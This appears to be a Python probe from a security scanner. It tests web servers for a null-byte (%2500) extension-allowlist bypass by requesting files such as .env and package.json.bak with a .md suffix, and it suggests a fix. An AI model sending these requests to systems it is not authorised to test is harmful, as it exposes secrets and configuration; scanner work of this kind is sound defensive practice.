#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Path-traversal: extension allowlist bypass via URL-encoded null byte.

Some apps gate file downloads / static-file serving by checking that
the requested filename ends with an allowed extension (`.md`, `.pdf`,
`.txt`, …). When that check is naive — string `endswith()` against the
raw URL path — an attacker can suffix a banned filename with `%2500.md`
and the URL-decoded handler reads up to the literal NUL while the
extension check sees only `.md`.

  Allowed:    GET /ftp/acquisitions.md          -> 200, returns the .md
  Blocked:    GET /ftp/package.json.bak         -> 403, "only .md / .pdf"
  BYPASSED:   GET /ftp/package.json.bak%2500.md -> 200, returns the .bak

The bug is broader than Juice Shop's `/ftp/` path; it can apply to any
static-serving handler that does extension-check-without-path-canonicalisation.
This probe walks a small catalogue of known sensitive filenames + the
%2500.md suffix, looks for content that's not an .md file (no markdown
headings; structured-data markers like JSON dependencies, script tags,
SQL CREATE statements), and reports a hit when the response body
matches a non-markdown shape.

Tested against:
  + OWASP Juice Shop  /ftp/package.json.bak%2500.md → 200 with
                       package.json content (`"dependencies"` etc.)
                       → validated=True
  + nginx default site                              → validated=False
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Per-target paths to attempt. The format is `<base-path>/<filename>`.
# We try the bypass form `<base-path>/<filename>%2500.<allowed-ext>`
# against each. Only fires when the response body looks like the
# non-markdown content the bug is supposed to expose.
#
# Each `body_signature_re` is applied to the response text only after
# the catch-all guards have passed (200 status, non-HTML content-type,
# no redirect, body doesn't contain login/HTML markers). The regex on
# its own is intentionally not strong enough to defend against a
# server that returns an HTML login page on every unknown path; the
# `_response_disqualified` filter in run() is what closes that hole.
TARGETED_FILES = (
    # (base_path, filename, allowed-ext, body_signature_re, what_it_is)
    ("/ftp", "package.json.bak", ".md",
     # Require BOTH dependencies and version keys — single-key match
     # would otherwise accept arbitrary JSON config files.
     r'"dependencies"\s*:.*"version"\s*:|"version"\s*:.*"dependencies"\s*:',
     "Node package manifest backup"),
    ("/ftp", "coupons_2013.md.bak", ".md",
     # At least three consecutive base64-shaped lines anchored to line
     # start/end. The old `[A-Za-z0-9+/=]{6,}` matched `doctype` from
     # `<!doctype html>` in any HTML page; this requires the line itself
     # to BE base64-shaped, so an HTML page cannot match.
     r"(?m)^[A-Za-z0-9+/=]{16,}$\n^[A-Za-z0-9+/=]{16,}$\n^[A-Za-z0-9+/=]{16,}$",
     "encoded coupon list"),
    ("/ftp", "suspicious_errors.yml", ".md",
     # Multiple YAML bullets, not just one stray dash.
     r"(?m)^- .+\n^- .+|\bSQLITE_ERROR\b",
     "internal error log"),
    ("/ftp", "quarantine/", ".md",
     r"<title>[^<]*listing", "quarantine directory listing"),
    ("/files", "config.bak", ".md",
     # JSON config — require at least two keys so any single `"foo":`
     # in HTML/JS doesn't trip it.
     r'"\w+"\s*:.*"\w+"\s*:', "JSON config backup"),
    ("/files", ".env", ".md",
     r"(?m)^\s*[A-Z_]+=\S+", "env file"),
    ("/uploads", "config.bak", ".md",
     r'"\w+"\s*:.*"\w+"\s*:', "JSON config backup in uploads"),
    ("/static", "config.json.bak", ".md",
     r'"\w+"\s*:.*"\w+"\s*:', "JSON config backup in static"),
)


def _response_disqualified(r, requested_url: str):
    """Return None when the response could plausibly be the target
    file, else a short reason describing why it is not. Mirrors the
    helper in path_traversal_ftp_download.py — both probes need the
    same set of "this is obviously not the bug" guards (no 3xx, no
    text/html, no silent redirect chase, no login-page markers)."""
    if r.status != 200:
        return f"status={r.status}"
    if not r.body:
        return "empty body"
    if r.final_url and r.final_url != requested_url:
        return f"redirected to {r.final_url}"
    ctype = (r.headers.get("content-type")
             or r.headers.get("Content-Type") or "").lower()
    if "text/html" in ctype or "application/xhtml" in ctype:
        return f"content-type={ctype} (HTML, not a file dump)"
    text_lower = (r.text or "").lower()
    if "<html" in text_lower or "<!doctype html" in text_lower:
        return "body looks like an HTML page"
    return None


class PathTraversalExtensionBypassProbe(Probe):
    name = "path_traversal_extension_bypass"
    summary = ("Detects extension-allowlist bypass via URL-encoded "
               "null byte (%2500) — a non-allowed file is served "
               "because the extension check sees only the suffix.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--path-spec", action="append", default=[],
            help="Additional 'base|filename|ext|regex|description' (pipe-"
                 "separated) target spec (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        targets = list(TARGETED_FILES)
        for spec in (args.path_spec or []):
            try:
                base, fn, ext, rx, desc = spec.split("|", 4)
                targets.append((base, fn, ext, rx, desc))
            except ValueError:
                pass    # ignore malformed extras

        attempts: list[dict] = []
        confirmed: list[dict] = []
        for base, fn, allowed_ext, body_re, what in targets:
            # The poison-null-byte form. %2500 is the URL-encoded form
            # of `%00` — the URL parser decodes it to a literal NUL,
            # which the underlying file-handler stops reading at.
            url = urljoin(origin, f"{base}/{fn}%2500{allowed_ext}")
            # follow_redirects=False prevents a 303→/login from being
            # silently walked into a 200 HTML page that looser regexes
            # could match.
            r = client.request("GET", url, follow_redirects=False)
            row: dict = {"base": base, "filename": fn,
                         "url": url, "status": r.status, "size": r.size,
                         "what": what}
            disq = _response_disqualified(r, url)
            if disq:
                row["rejected"] = disq
                attempts.append(row)
                continue
            m = re.search(body_re, r.text, re.MULTILINE)
            if m:
                row["bypassed"] = True
                row["body_match"] = m.group(0)[:120]
                confirmed.append(row)
            attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            top = confirmed[0]
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: extension-allowlist bypass via "
                         f"%2500 null-byte at {origin}{top['base']}/"
                         f"{top['filename']} — server returned the "
                         f"{top['what']} ({top['size']} bytes), not the "
                         f"expected {top['filename'].rsplit('.',1)[-1]} "
                         "extension."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="high",
                remediation=(
                    "Replace the extension allowlist string-match with a "
                    "proper path-canonicalisation step BEFORE the check. "
                    "In Node:\n"
                    "  const safe = path.basename(decodeURIComponent(req.url));\n"
                    "  if (!/\\.(md|pdf)$/.test(safe)) return res.status(403);\n"
                    "Decoding the URL first, then re-checking, defeats "
                    "%2500 / %00 / Unicode-NUL embed tricks. Pair with "
                    "moving the served directory entirely out of the "
                    "document-root if it contains files the public was "
                    "never supposed to see."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} known sensitive "
                     f"filenames against the %2500 bypass on {origin}; "
                     "none returned non-allowed-extension content."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PathTraversalExtensionBypassProbe().main()
